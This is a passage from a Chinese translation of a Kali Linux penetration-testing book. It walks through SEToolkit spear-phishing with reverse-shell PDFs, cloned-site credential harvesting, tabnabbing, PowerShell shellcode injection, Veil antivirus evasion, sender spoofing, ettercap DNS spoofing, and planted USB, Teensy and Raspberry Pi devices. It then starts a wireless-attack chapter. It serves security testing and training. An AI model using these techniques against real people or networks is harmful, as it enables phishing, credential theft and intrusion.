![鱼叉式网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_04.jpg)

最有效的攻击之一是`15) Adobe PDF Embedded EXE Social Engineering`；然而，所选择的攻击将取决于攻击者在侦察阶段获得的可用目标的知识。

在提示要使用您自己的 PDF 还是内置的空白 PDF 进行攻击时，选择内置的空白有效载荷的选项`2`，如下面的屏幕截图所示。然后将提示您选择有效载荷。

![鱼叉式网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_05.jpg)

通过在多个网络上进行测试，我们发现选项`1`和`2`（`Windows Reverse TCP shell`和`Windows Meterpreter Reverse TCP`）是最可靠的有效载荷。在本示例中，我们将选择`Windows Meterpreter Reverse TCP`——当打开 PDF 时，它将执行一个反向 shell 返回到攻击系统。

在隐蔽性比可靠性更重要的情况下，`Windows Meterpreter Reverse HTTPS`是最佳选择。

SEToolkit 将提示输入有效载荷侦听器（攻击者的 IP 地址）和侦听端口，默认端口为`443`。

下一个菜单提示更改 PDF 文件的文件名；默认名称为`moo.pdf`，如下面的屏幕截图所示。

![鱼叉式网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_06.jpg)

默认名称不太可能吸引潜在受害者打开文件；此外，它可能会被客户端安全识别。出于这些原因，文件名应更改。名称应反映被攻击的目标受众。例如，如果您的目标是财务组，给 PDF 文件一个标题，比如税法修正案。

现在，您将被提供攻击单个电子邮件地址或群发邮件的选项（例如，目标公司的员工列表或公司内的特定群体）。本示例选择了选项`1`。

SEToolkit 然后会提示您使用预定义模板或制作一次性电子邮件模板。如果您选择预定义模板，将提供以下选项：

![鱼叉式网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_07.jpg)

有效的社会工程攻击是为目标而制定的；因此，选择选项`2`，`一次性使用电子邮件模板`，以创建一次性使用电子邮件模板，如下面的屏幕截图所示：

![鱼叉式网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_08.jpg)

您将被提供使用您自己的 Gmail 帐户发动攻击（`1`）或使用您自己的服务器或开放中继（`2`）的选项。如果您使用 Gmail 帐户，攻击很可能会失败，您将收到以下消息：

```
[!] Unable to deliver email. Printing exceptions message
below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and it is most likely getting caught. 

```

Gmail 检查出站电子邮件中的恶意文件，并且非常有效地识别 SEToolkit 和 Metasploit Framework 生成的有效载荷。如果您必须使用 GMail 发送有效载荷，请使用`Veil-Evasion`对其进行编码。

建议您使用`sendmail`选项发送可执行文件；此外，它允许您伪造电子邮件的来源，使其看起来好像来自可信任的来源。

目标将收到以下电子邮件消息：

![鱼叉式网络钓鱼攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_09.jpg)

为了确保电子邮件的有效性，攻击者应该注意以下几点：

+   内容应提供“胡萝卜”（新服务器将更快，具有改进的防病毒功能）和“棍棒”（您必须在访问电子邮件之前进行的更改）。大多数人对立即行动的呼吁做出反应，特别是当它影响到他们时。

+   在先前给出的示例中，附加的文档标题为`template.doc`。在实际情况下，这将更改为`Email instructions.doc`。

+   确保您的拼写和语法正确，并且消息的语气与内容相匹配。

+   发送电子邮件的个人的标题应与内容相匹配。如果目标组织很小，您可能需要伪造一个真实个人的名字，并将电子邮件发送给一个通常不与该人互动的小组。

+   包括电话号码 - 这使得电子邮件看起来更“正式”，并且有各种方法可以使用商业 VoIP 解决方案获得带有本地区号的临时电话号码。

一旦攻击邮件发送给目标，成功激活（接收者启动可执行文件）将在攻击者的系统上创建一个反向 Meterpreter 隧道。然后，攻击者将利用 Meterpreter 和其他工具进行典型的后渗透活动。

## 使用网站攻击向量 - Java 小程序攻击方法

`Java 小程序攻击方法`使用感染的 Java 小程序将恶意应用加载到目标系统上。许多攻击者青睐这种攻击，因为它非常可靠，并且对 Windows、Linux 和 Mac OS X 系统都有效。

要发动攻击，打开 SEToolkit 并从主菜单中选择选项`2) 网站攻击向量`。然后选择选项`1) Java 小程序攻击方法`，启动初始菜单，如下截图所示：

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_10.jpg)

网页模板的选项包括`Java Required`、`Gmail`、`Google`、`Facebook`、`Twitter`和`Yahoo`。如下截图所示的**Java Required**页面通常很有效，因为它直接提示用户在继续之前更新重要的软件。

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_11.jpg)

您还可以选择克隆现有网站，比如目标公司的网站。

在做出选择后，攻击者将被提示确定是否使用端口/NAT 转发，并提供攻击机器的 IP 地址进行反向连接，如下截图所示：

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_12.jpg)

### 提示

SEToolkit 对文字换行处理不佳，通常输入的响应会回卷并覆盖命令行的一部分。

在提供所需的 URL 后，SEToolkit 将开始网站克隆过程，如下截图所示。完成后，应用程序将开始生成有效载荷和支持文件（`.jar`存档和克隆的`index.html`文件）。

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_13.jpg)

下一阶段包括有效载荷的选择。如果隐蔽特别重要，使用选项`17`选择使用`veil`编码的可执行文件，如下截图所示：

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_14.jpg)

选择编码选项以绕过目标系统上的本地防病毒软件；其中最有效的是第四个选项`Backdoored Executable`，如下截图所示：

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_15.jpg)

该应用程序将提示输入监听端口，然后开始在受害者的计算机上生成常用端口（`25`、`53`、`80`、`443`等）的代码，如下截图所示：

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_16.jpg)

现在是社会工程学的步骤 - 攻击者必须说服目标人员连接到监听系统的 IP 地址。如果目标进入该系统，他们将被引导到监听器上托管的克隆站点。

该网站将向目标人员显示安全警告，如下截图所示，指示需要执行应用程序才能访问该网站。

![使用网站攻击向量 - Java 小程序攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_17.jpg)

如果用户选择执行该应用程序，将在他们的计算机和攻击者的计算机之间形成一个反向 shell（取决于所选的有效负载）。

所呈现的两种攻击展示了 SEToolkit 用于使用反向 shell 或类似有效载荷控制目标计算机的不同方法。攻击者可以通过多种方式扩展控制，例如使用 VNC 有效载荷或放置 RATTE。

然而，这些攻击是具有侵入性的 - 反向 shell 可能会触发防火墙的出站警报，因为它连接到攻击者的机器。更重要的是，有效载荷可能被反向工程化以识别有关攻击者的信息。

最后，攻击的目标可能不是立即妥协；相反，攻击者可能希望收集用户凭证以支持以后的攻击，或在互联网上的多个地方重复使用凭证。因此，让我们来看一下凭证收割攻击。

## 使用网站攻击向量 - 凭证收割者攻击方法

凭证通常是用户名和密码，可以让一个人访问网络、计算系统和数据。攻击者可以间接使用这些信息（通过登录受害者的 Gmail 帐户并发送电子邮件来促成对受害者信任连接的攻击），或直接针对用户的帐户。鉴于凭证的广泛重复使用，这种攻击尤其相关 - 用户通常在多个地方重复使用密码。

特别珍贵的是具有特权访问权限的人的凭证，例如系统管理员或数据库管理员，这可以让攻击者访问多个帐户和数据存储库。

SEToolkit 的凭证收割攻击使用克隆站点来收集凭证。

要发动这种攻击，从主菜单中选择`网站攻击向量`，然后选择`凭证收割者攻击方法`。在这个例子中，我们将按照菜单选择来克隆一个网站，比如 Facebook。

再次，目标 IP 地址必须发送给预定目标。当目标点击链接或输入 IP 地址时，他们将看到一个类似于 Facebook 常规登录页面的克隆页面，并被提示输入他们的用户名和密码。

完成后，用户将被重定向到常规的 Facebook 网站，在那里他们将登录到他们的帐户。

在后台，他们的访问凭证将被收集并转发给攻击者。他们将在监听窗口中看到以下条目：

![使用网站攻击向量 - 凭证收割者攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_18.jpg)

当攻击者收集完凭证后，输入*CTRL* + *C* 将在`/SET/reports`目录中以 XML 和 HTML 格式生成两份报告。

类似的攻击选项是`Web Jacking Attack`。当受害者打开攻击者的链接时，他们将看到一个页面，通知他们选择的页面已经移动，如下面的屏幕截图所示：

![使用网站攻击向量 - 凭证收割者攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_19.jpg)

当用户点击链接前往新位置时，他们将看到一个看起来像预期页面的克隆页面，如下面的屏幕截图所示；同样，页面将收割他们的登录凭证。

![使用网站攻击向量 - 凭证收割者攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_20.jpg)

### 注意

请注意，URL 栏中的地址不是 Google 的有效地址；大多数用户如果能看到这个地址，就会意识到有问题。成功的利用需要攻击者准备好一个合适的借口或故事，使受害者接受异常的 URL。例如，向一个非技术经理的目标群体发送电子邮件，宣布“本地 Google 邮件站现在由 IT 托管，以减少邮件系统中的延迟”。

凭据收割攻击是评估企业网络安全的绝佳工具。要有效，组织必须首先培训所有员工如何识别和应对钓鱼攻击。大约两周后，发送一封包含一些明显错误（公司 CEO 的错误姓名或包含错误地址的地址块）和一个收集凭据的程序链接的公司范围内的电子邮件。计算回复其凭据的收件人的百分比，然后调整培训计划以减少这一百分比。

## 使用网站攻击向量 - Tabnabbing 攻击方法

Tabnabbing 通过在浏览器的一个打开标签中加载一个假页面来利用用户的信任。通过冒充 Gmail、Facebook 或任何其他*发布*数据的网站的页面（通常是用户名和密码），Tabnabbing 攻击可以收集受害者的凭据。社会工程工具包调用了我们之前描述的凭据收割攻击。

要发动这次攻击，从控制台提示中启动社会工程工具包，然后选择`1) 社会工程攻击`。在下一个菜单中，选择`2) 网站攻击向量`。通过选择`4) Tabnabbing 攻击方法`来发动 Tabnabbing 攻击。

攻击发动时，您将被提示三个选项来生成用于收集凭据的假网站。攻击者可以允许`setoolkit`导入预定义的网站应用程序列表，克隆网站（如 Gmail），或导入他们自己的网站。在这个例子中，我们将选择`2) 网站克隆器`。

这将提示攻击者输入服务器将 POST 到的 IP 地址；这通常是攻击者系统的 IP 地址。然后攻击者将被提示输入要克隆的网站的 URL。在下图中，选择了 Gmail 的网站。

然后攻击者必须利用社会工程学来迫使受害者访问用于回传操作的 IP 地址（例如，URL 缩短）。受害者将收到一个网站正在加载的消息（因为攻击脚本在浏览器的不同标签中加载克隆的网站，如下图所示）：

![使用网站攻击向量 - Tabnabbing 攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_21.jpg)

然后目标将被呈现出假页面（假 IP 地址仍然可见）。如果用户输入他们的用户名和密码，数据将被发布到攻击者系统上的监听器。如下图所示，它已经捕获了用户名和密码。

![使用网站攻击向量 - Tabnabbing 攻击方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_22.jpg)

## 使用网站攻击向量 - 多重攻击 Web 方法

网站攻击向量的“hail Mary”攻击是`多重攻击 Web 方法`，允许攻击者一次实施多种不同的攻击。默认情况下，所有攻击都被禁用，攻击者选择要针对受害者运行的攻击，如下图所示：

![使用网站攻击向量 - 多重攻击 Web 方法](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_23.jpg)

如果您不确定哪些攻击对目标组织有效，这是一个有效的选择；选择一个员工，确定成功的攻击，然后对其他员工重复使用这些攻击。

# 使用 PowerShell 字母数字 shellcode 注入攻击

社会工程工具包还包括基于 PowerShell 的更有效攻击，这在发布 Microsoft Vista 后的所有 Microsoft 操作系统上都可用。因为 PowerShell shellcode 可以轻松注入到目标的物理内存中，使用这个向量的攻击不会触发反病毒警报。

要使用`setoolkit`发动 PowerShell 注入攻击，从主菜单中选择`1) 社会工程攻击`。然后从下一个菜单中选择`10) Powershell 攻击向量`。

这将给攻击者四种攻击类型的选择；在这个例子中，选择`1`来调用`PowerShell 字母数字 shellcode 注入器`。

这将设置攻击参数，并提示攻击者输入载荷监听器的 IP 地址，通常是攻击者的 IP 地址。输入后，程序将创建利用代码并启动本地监听器。

启动攻击的 PowerShell shellcode 存储在`/root/.set/reports/powershell/x86_powershell_injection.txt`中。

当攻击者说服受害者在命令提示符上复制`x86_powershell_injection.txt`的内容，并执行代码时，社会工程攻击的一部分就发生了，如下截图所示。

![使用 PowerShell 字母数字 shellcode 注入攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_24.jpg)

如下截图所示，执行 shellcode 并没有在目标系统上触发反病毒警报。相反，当代码执行时，它在攻击系统上打开了一个 meterpreter 会话，并允许攻击者与远程系统建立交互式 shell。

![使用 PowerShell 字母数字 shellcode 注入攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_25.jpg)

# 隐藏可执行文件并混淆攻击者的 URL

如前面的例子所示，发动社会工程攻击的成功有两个关键。第一个是获取使其生效所需的信息——用户名、业务信息以及有关网络、系统和应用程序的支持细节。

然而，大部分工作重点放在第二个方面上——精心设计攻击，诱使目标打开可执行文件或点击链接。

几种攻击会生成需要受害者执行才能成功的模块。不幸的是，用户越来越警惕执行未知软件。然而，有一些方法可以增加攻击成功执行的可能性，包括以下方法：

+   从受害者已知和信任的系统发起攻击，或者欺骗攻击源。如果攻击似乎来自帮助台或 IT 支持，并声称是“紧急软件更新”，那么它很可能会被执行。

+   将可执行文件重命名为类似于受信任软件的名称，比如“Java 更新”。

+   将恶意载荷嵌入到诸如 PDF 文件之类的良性文件中，使用 Metasploit 的`adobe_pdf_embedded_exe_nojs`攻击之类的攻击。可执行文件也可以绑定到 Microsoft Office 文件、MSI 安装文件或配置为在桌面上静默运行的 BAT 文件。

+   让用户点击一个链接，下载恶意可执行文件。

由于 SEToolkit 使用攻击者的 URL 作为其攻击的目的地，关键的成功因素是确保攻击者的 URL 对受害者是可信的。有几种技术可以实现这一点，包括以下方法：

+   使用像[goo.gl](http://goo.gl)或[tinyurl.com](http://tinyurl.com)这样的服务缩短 URL。缩短的 URL 在 Twitter 等社交媒体中很常见，受害者很少在点击此类链接时采取预防措施。

+   在社交媒体网站上输入链接，如 Facebook 或 LinkedIn；该网站将创建自己的链接来替换你的链接，并附上目标页面的图片。然后，删除你输入的链接，只留下新的社交媒体链接。

+   在 LinkedIn 或 Facebook 上创建一个假的网页——作为攻击者，你控制内容，并可以创建一个引人注目的故事，驱使成员点击链接或下载可执行文件。一个精心设计的页面不仅会针对员工，还会针对供应商、合作伙伴和他们的客户，最大程度地提高社会工程攻击的成功率。

+   将链接嵌入到诸如 PowerPoint 之类的文件中。

要在 PowerPoint 中嵌入链接，启动它并将扩展名保存为`.pps`，创建一个幻灯片放映。给演示文稿一个对目标人感兴趣的标题，并创建一些通用内容文件。在首页，插入一个文本框，并将框拖动到覆盖该幻灯片的整个表面。单击**插入**，然后选择**操作**选项卡。在对话框中，单击**超链接**单选按钮，然后从下拉菜单中选择**URL**。输入用于发动攻击的 URL，如下面的屏幕截图所示：

![隐藏可执行文件和混淆攻击者的 URL](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_26.jpg)

文件打开后，它将作为全屏幻灯片放映。因为攻击是通过鼠标悬停启动的，用户在尝试关闭文档时将启动攻击。

# 使用 DNS 重定向升级攻击

如果攻击者或渗透测试人员已经攻破了内部网络上的主机，他们可以使用 DNS 重定向来升级攻击。这通常被认为是一种水平攻击（它会危害大致具有相同访问权限的人）；但是，如果捕获了特权人员的凭据，它也可以垂直升级。

在这个例子中，我们将使用 ettercap 作为交换式局域网的嗅探器、拦截器和记录器。它促进了中间人攻击，但我们将使用它来发动 DNS 重定向攻击，将用户转移到我们用于社会工程攻击的网站。

要启动攻击，我们必须首先修改位于`/etc/ettercap/etter.dns`的 ettercap 配置文件，将查询重定向到我们的恶意站点。在配置文件中找到使用 Microsoft 站点的示例；复制相同的细节以将目标站点请求重定向到恶意 IP 地址，如下面的屏幕截图所示：

![使用 DNS 重定向升级攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_27.jpg)

通过在命令提示符下键入`ettercap –G`以图形模式启动 ettercap。从**嗅探**选项卡中，从下拉菜单中选择**统一**嗅探，如下面的屏幕截图所示：

![使用 DNS 重定向升级攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_28.jpg)

在提示选择网络接口时，选择内部网络的**eth0**（如您所见，ettercap 还将在选择不同接口时支持无线攻击）。您会看到选项卡式菜单发生变化，给您更多选项。

从**主机**选项卡中，从下拉菜单中选择**扫描主机**。它将进行快速扫描，然后报告“x 个主机已添加到主机列表”。从**主机**选项卡中，选择**主机列表**以查看可能的目标系统列表，如下面的屏幕截图所示：

![使用 DNS 重定向升级攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_29.jpg)

突出显示您希望定位的已识别系统（例如，位于交换式局域网相同段上的所有主机），并选择**添加到目标 1**选项卡。

完成后，选择**插件**选项卡，这将为您提供可供使用的 ettercap 插件列表。选择**ec_dns_spoof.so**插件，如下面的屏幕截图所示：

![使用 DNS 重定向升级攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_30.jpg)

要发动攻击，选择**Mitm**选项卡，并从下拉菜单中选择**ARP 欺骗**，如下面的屏幕截图所示。ettercap 将在所选系统上毒化地址解析协议表或缓存。

![使用 DNS 重定向升级攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_31.jpg)

当选择 ARP 欺骗时，将提供可选参数。选择嗅探远程连接的参数。然后，转到**开始**选项卡，并选择开始统一嗅探。

当任何一个被攻击的系统上的用户尝试访问 Facebook 时，他们的缓存表将无法为他们提供互联网上的位置。Ettercap 将把他们的查找重定向到你在配置文件中提供的 URL，并且用户将被引导到攻击者准备的敌对网页，并且将受到诸如凭证窃取之类的攻击。

在任何时候，被攻击的人都会在他们的浏览器窗口中看到一个明显正确的 URL。

DNS 重定向可以用于促进依赖用户点击 URL 链接发起攻击的所有攻击，并且这适用于有线和无线网络。

# 物理接触和敌对设备

Kali 和 SEToolkit 还可以促进攻击，入侵者直接物理接触系统和网络。这可能是一种风险攻击，因为入侵者可能会被警觉的人发现，或者被监视设备抓住。然而，奖励可能是巨大的，因为入侵者可以 compromise 具有有价值数据的特定系统。

物理接触通常是社会工程学的直接结果，特别是在使用冒充的情况下。常见的冒充包括以下内容：

+   一个声称来自帮助台或 IT 支持的人，只需要快速打断受害者安装系统升级。

+   一个供应商去拜访客户，然后借口去和其他人交谈或去洗手间。

+   一个送货员送货。攻击者可以选择在网上购买送货员制服；然而，由于大多数人认为任何穿着全身棕色并推着装满箱子的手推车的人都是 UPS 的送货员，制服很少是社会工程学的必要条件！

+   穿着工作服的工匠，携带着他们打印出来的“工作订单”，通常被允许进入布线间和其他区域，特别是当他们声称是应建筑经理的要求而在场时。

+   穿着昂贵的西装，携带剪贴板，走得很快——员工会认为你是一个不认识的经理。在进行这种类型的渗透时，我们通常会告诉人们我们是审计员，我们的检查很少受到质疑。

敌对物理接触的目标是迅速损害选定的系统；这通常是通过在目标上安装后门或类似设备来实现的。

经典攻击之一是将 CD-ROM、DVD 或 USB 键放入系统中，并让系统使用自动播放选项安装它；然而，许多组织在整个网络上禁用了自动播放。

攻击者还可以创建“有毒诱饵”陷阱——包含邀请人点击文件并检查其内容的文件的移动设备。一些例子包括以下内容：

+   USB 键带有标签，如员工工资或医疗保险更新。

+   Metasploit 允许攻击者将一个有效载荷（如反向 shell）绑定到一个可执行文件，如屏幕保护程序。攻击者可以使用公开可用的公司图像创建一个屏幕保护程序，并将 CD 邮寄给员工，带有新的*认可的屏幕保护程序*。当用户安装该程序时，后门也被安装，并连接到攻击者。

+   如果你知道员工最近参加了一个会议，攻击者可以冒充出席的供应商，并发送给目标一封暗示这是供应商展会后续的信件。一个典型的消息将是，“如果你错过了我们的产品演示和一年免费试用，请通过点击 start.exe 查看附加的 USB 键上的幻灯片展示”。

一个有趣的变种是 SanDisk U3 USB 键，或者 Smart Drive。U3 键预装了启动软件，当插入时自动允许键直接向主机计算机写入文件或注册表信息，以帮助启动批准的程序。`u3-pwn`工具（**Kali Linux** | **维持访问** | **操作系统后门** | **u3**-**pwn**）从 SanDisk U3 中删除原始 ISO 文件，并用敌意的 Metasploit 有效负载替换，然后对其进行编码，以避免在目标系统上被检测到。

不幸的是，对这些 USB 设备的支持正在减少，它们仍然容易受到与其他 Metasploit 有效负载相同程度的检测。

一个新兴的选择是使用 Teensy——一个小型集成电路设备，插入 Windows 系统后会注册为 USB 键盘。这使得它可以绕过禁用自动运行或使用客户端反病毒软件的系统。Teensy 可以在亚马逊上购买，价格大约为 20 到 25 美元。

`setoolkit`生成了 Teensy 所需的代码，将其转变为攻击向量，如下图所示：

![物理访问和敌意设备](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_32.jpg)

配置为敌意代理的 Teensy 非常强大；在对企业客户进行渗透测试时，我们的测试人员已经证明了至少有百分之百的机会能够感染每个被测试网络上的至少一个系统！

不幸的是，这些设备存在一个重大限制——它们只能执行它们被编程执行的任务，攻击者或渗透测试人员在发现后的利用能力有限。

为了弥补这一不足，攻击者现在正在使用微型计算机，比如树莓派，作为攻击向量。

## 树莓派攻击向量

树莓派是一台微型计算机——大约尺寸为 8.5 厘米 X5.5 厘米，但它装有 512MB 的 RAM，两个 USB 端口和一个由 ARM 处理器运行的 700MHz 的以 Broadcom 芯片支持的以太网端口（可以超频到 1GHz）。它不包括硬盘，而是使用 SD 卡进行数据存储。如下图所示，树莓派大约是笔的三分之二长度；它很容易隐藏在网络中（在工作站或服务器后面，放在服务器柜内，或者隐藏在数据中心的地板板下）。

![树莓派攻击向量](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_07_33.jpg)

要将树莓派配置为攻击向量，需要以下物品：

+   树莓派 B 型，或更新版本

+   一个 HDMI 电缆

+   一个 Micro USB 电缆和充电块

+   一个以太网电缆或迷你无线适配器

+   一张至少 8GB 的 SD 卡，Class 10

所有这些物品通常可以在线购买，总价不到 100 美元。

要配置树莓派，下载最新版本的 Kali Linux ARM 版，并从源存档中提取。如果你是从基于 Windows 的桌面配置的，那么下载并提取 Win32DiskImager（[`sourceforge.net/projects/win32diskimager/`](http://sourceforge.net/projects/win32diskimager/)）。

使用读卡器，将 SD 卡连接到基于 Windows 的计算机，并打开**Win32DiskImager**。选择 Kali 的 ARM 版本，`kali-custom-rpi.img`，该版本已经下载并提取，然后将其写入 SD 卡。这将需要一些时间。

从 Mac 或 Linux 系统刷写 SD 卡的单独说明可在 Kali 网站上找到。

将新刷好的 SD 卡插入树莓派，并将以太网电缆或无线适配器连接到 Windows 工作站，HDMI 电缆连接到显示器，Micro USB 电源线连接到电源。供电后，它将直接启动 Kali Linux。树莓派依赖外部电源，没有单独的开关；但是，Kali 仍然可以通过命令行关闭。

安装 Kali 后，确保使用 apt-get 命令进行更新。

确保尽快更改 SSH 主机密钥，因为所有的树莓派镜像都有相同的密钥。使用以下命令：

```
root@kali:~rm /etc/ssh/ssh_host_*
root@kali:~dpkg-reconfigure openssh-server
root@kali:~ service ssh restart

```

同时，确保更改默认用户名和密码。

下一步是配置树莓派定期连接回攻击者的计算机（使用静态 IP 地址或动态 DNS 寻址服务）使用**cron**。

然后，攻击者必须亲自进入目标的场所，并将树莓派连接到网络。大多数网络会自动分配设备一个 DHCP 地址，并且对这种类型的攻击有限的控制。

一旦树莓派连接回攻击者的 IP 地址，攻击者可以从远程位置使用 SSH 发出命令，对受害者的内部网络进行侦察和利用应用程序。

如果连接了无线适配器，比如 EW-7811Un，150 Mbps 无线 802.11b/g/n 纳米 USB 适配器，攻击者可以无线连接，或者使用树莓派发动无线攻击（第八章，*利用无线通信*）。

# 摘要

社会工程学是一种*黑客人类*的方法-利用人的天生信任和乐于助人的特点来攻击网络及其设备。

在本章中，我们研究了社会工程如何被用来促进旨在收集网络凭证、激活恶意软件或协助发动进一步攻击的攻击。大多数攻击依赖于社会工程工具包；然而，Kali 还有其他几个应用程序，可以使用社会工程学方法进行改进。我们还研究了如何利用物理访问，通常与社会工程学结合使用，来在目标网络上放置敌对设备。

在下一章中，我们将研究如何对无线网络进行侦察，并攻击开放网络以及受到基于 WEP、WPA 和 WPA2 加密方案保护的网络。我们还将研究无线协议的一般弱点，使其容易受到拒绝服务攻击和冒充攻击的影响。



# 第八章：利用无线通信

随着移动设备的主导地位和提供即时网络连接的需求，无线网络已成为通往互联网的无处不在的接入点。不幸的是，无线访问的便利性伴随着有效攻击的增加，导致访问和数据的窃取，以及网络资源的拒绝服务。Kali 提供了几个工具来配置和发动这些无线攻击，使组织能够提高安全性。

在本章中，我们将研究几个日常维护任务和无线攻击，包括：

+   配置 Kali 进行无线攻击

+   无线侦察

+   绕过 MAC 地址认证

+   破解 WEP 加密

+   攻击 WPA 和 WPA2

+   无线攻击和社会工程学-克隆接入点

+   拦截通信-中间人无线攻击

+   中间人无线攻击

+   **拒绝服务**（DoS）攻击无线通信

# 配置 Kali 进行无线攻击

Kali Linux 发布了几个工具，以便测试无线网络；然而，这些攻击需要进行广泛的配置才能发挥完整的效果。此外，测试人员在实施攻击或审计无线网络之前，应该具备扎实的无线网络背景。

无线安全测试中最重要的工具是无线适配器，它连接到无线接入点。它必须支持所使用的工具，特别是`aircrack-ng`套件工具；特别是，适配器的芯片组和驱动程序必须具有将无线数据包注入通信流的能力。这是对需要将特定数据包类型注入到目标和受害者之间的流量中的攻击的要求。注入的数据包可以导致拒绝服务，使攻击者能够捕获破解加密密钥或支持其他无线攻击所需的握手数据。

`aircrack-ng`网站（[www.aircrack-ng.org](http://www.aircrack-ng.org)）包含已知兼容的无线适配器列表。

可以与 Kali 一起使用的最可靠的适配器是 ALFA NETWORK 卡，特别是**AWUS036NH**适配器，它支持无线 802.11 b、g 和 n 协议。Alfa 卡在网上很容易获得，并将支持使用 Kali 进行的所有测试和攻击。

# 无线侦察

进行无线攻击的第一步是进行侦察——这将确定确切的目标接入点，并突出显示可能影响测试的其他无线网络。

如果您使用 USB 连接的无线网卡连接到 Kali 虚拟机，请确保 USB 连接已从主机操作系统断开，并通过单击 USB 连接图标将其连接到 VM，该图标在以下截图中由箭头表示：

![无线侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_01.jpg)

接下来，通过从命令行运行`iwconfig`来确定可用的无线接口，如下截图所示：

![无线侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_02.jpg)

对于某些攻击，您可能希望增加适配器的功率输出。如果您与合法的无线接入点共处，并且希望目标连接到您控制的虚假接入点而不是合法接入点，则这是非常有用的。这些虚假的，或**流氓**，接入点允许攻击者拦截数据并根据需要查看或更改数据以支持攻击。攻击者经常会复制或克隆一个合法的无线站点，然后增加其传输功率以吸引受害者。要增加功率，使用以下命令：

```
kali@linux:~# iwconfig wlan0 txpower 30

```

许多攻击将使用`aircrack-ng`及其相关工具进行。首先，我们需要能够拦截或监视无线传输；因此，我们需要使用`airmon-ng`命令将 Kali 通信接口设置为*监视模式*：

```
kali@linux:~# airmon-ng start wlan0

```

执行上一个命令的结果显示在以下截图中：

![无线侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_03.jpg)

请注意，返回的描述表明有一些进程*可能会引起麻烦*。处理这些进程的最有效方法是使用全面的 kill 命令，如下所示：

```
root@kali:~# airmon-ng check kill

```

要查看本地无线环境，请使用以下命令：

```
root@kali:~# airodump-ng mon0

```

上一个命令列出了可以在特定时间点内在无线适配器范围内找到的所有已识别的网络。它提供了网络上无线节点的 BSSID，由 MAC 地址标识，相对输出功率的指示，发送的数据包信息，包括使用的信道的带宽信息，以及数据，加密使用的信息，以及 ESSID，提供了无线网络的名称。此信息显示在以下截图中；非必要的 ESSID 已被模糊处理：

![无线侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_04.jpg)

`airodump`命令循环遍历可用的无线信道，并识别以下内容：

+   基本服务集标识符（BSSID），这是唯一的 MAC 地址，用于识别无线接入点或路由器。

+   每个网络的`PWR`或功率。虽然`airodump-ng`错误地显示功率为负，但这是一种报告工件。要获得正确的正值，请访问终端并运行`airdriver-ng unload 36`，然后运行`airdriver-ng load 35`。

+   `CH`显示正在使用的信道。

